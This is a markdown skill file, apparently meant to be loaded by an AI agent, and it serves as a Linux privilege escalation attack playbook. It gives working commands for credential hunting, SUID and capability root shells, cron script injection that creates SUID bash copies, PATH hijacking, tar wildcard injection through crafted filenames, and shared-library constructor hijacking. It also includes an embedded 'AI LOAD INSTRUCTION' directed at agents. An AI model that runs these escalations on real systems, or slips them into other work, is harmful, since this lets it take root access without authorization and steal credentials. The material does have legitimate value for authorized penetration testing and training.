For other original section numbers, use the [entry index](../SKILL.md#references).


# SKILL: Linux Privilege Escalation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Linux privesc techniques. Covers enumeration, SUID/SGID, capabilities, cron abuse, kernel exploits, NFS, writable passwd/shadow, LD_PRELOAD, Docker group, and library hijacking. Base models miss subtle escalation paths via capabilities and combined misconfigurations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [container-escape-techniques](../../container-escape-techniques/SKILL.md) when the target is a container and you need to escape to host
- [linux-security-bypass](../../linux-security-bypass/SKILL.md) when facing restricted shells, AppArmor, SELinux, or seccomp
- [linux-lateral-movement](../../linux-lateral-movement/SKILL.md) after obtaining root for pivoting to adjacent hosts
- [kubernetes-pentesting](../../kubernetes-pentesting/SKILL.md) when the host is a Kubernetes node

### Advanced Reference

Also load [SUID_CAPABILITIES_TRICKS.md](../SUID_CAPABILITIES_TRICKS.md) when you need:
- Top 30 SUID binaries with exact exploitation commands (GTFOBins)
- Capability-specific exploitation for each dangerous cap
- Custom SUID binary exploitation methodology

Also load [KERNEL_EXPLOITS_CHECKLIST.md](../KERNEL_EXPLOITS_CHECKLIST.md) when you need:
- Kernel version → exploit mapping table (DirtyPipe, DirtyCow, OverlayFS, etc.)
- Exploit compilation tips and cross-compilation notes
- Kernel exploit stability assessment

---

## 1. ENUMERATION CHECKLIST

Run these immediately after landing a shell:

### System Info

```bash
uname -a                        # Kernel version
cat /etc/os-release             # Distro and version
cat /proc/version               # Kernel compile info
hostname && id && whoami        # Current context
```

### Sudo & SUID/SGID

```bash
sudo -l                         # What can we run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
getcap -r / 2>/dev/null         # Files with capabilities
```

### Cron & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all     # systemd timers
```

### Writable Files & Dirs

```bash
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow  # Check permissions
find / -perm -o+w -type d 2>/dev/null   # World-writable dirs
```

### Network & Services

```bash
ss -tlnp                        # Listening services
cat /proc/net/tcp               # Raw TCP connections
ps aux                          # Running processes
env                             # Environment variables (credentials?)
```

### Credential Locations

```bash
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID EXPLOITATION

### GTFOBins Methodology

1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)
3. Use the "SUID" section specifically — not all binary abuse works with SUID

### Quick-Win SUID Escalations

| Binary | Command |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `cp` | Copy `/etc/passwd`, add root user, copy back |

### Shared Library Hijacking (SUID Binary)

```bash
ldd /usr/local/bin/suid_binary                    # Check loaded libraries
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # Find load paths

# If it loads from a writable directory — inject constructor:
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
```

---

## 3. CAPABILITIES ABUSE

| Capability | Risk | Exploitation |
|---|---|---|
| `cap_setuid` | **Critical** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **Critical** | Read/write any file regardless of permissions |
| `cap_dac_read_search` | **High** | Read any file — dump `/etc/shadow` |
| `cap_sys_admin` | **Critical** | Mount filesystems, BPF, namespace manipulation |
| `cap_sys_ptrace` | **High** | Inject into root processes via ptrace |
| `cap_net_raw` | **Medium** | Sniff traffic, ARP spoofing |
| `cap_net_bind_service` | **Low** | Bind to privileged ports (<1024) |
| `cap_fowner` | **High** | Change ownership of any file |

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: python3 with cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. CRON / TIMER ABUSE

### Writable Cron Scripts

```bash
# Find cron jobs running as root
cat /etc/crontab | grep root
ls -la /etc/cron.d/

# If a root-owned cron runs a script writable by current user:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh
# Wait for cron → /tmp/bash -p
```

### PATH Hijacking in Cron

```bash
# If crontab has: PATH=/home/user:/usr/local/bin:/usr/bin
# And runs: * * * * * root backup.sh (without full path)
# Create /home/user/backup.sh:
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
```

### Wildcard Injection (tar)

```bash
# If cron runs: tar czf /backup/archive.tar.gz *
# In the target directory, create:
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# tar interprets filenames as arguments
```

### pspy — Monitor Processes Without Root

```bash
# Upload pspy64 or pspy32 to target
./pspy64
# Watch for cron jobs, services, and background processes
```

---

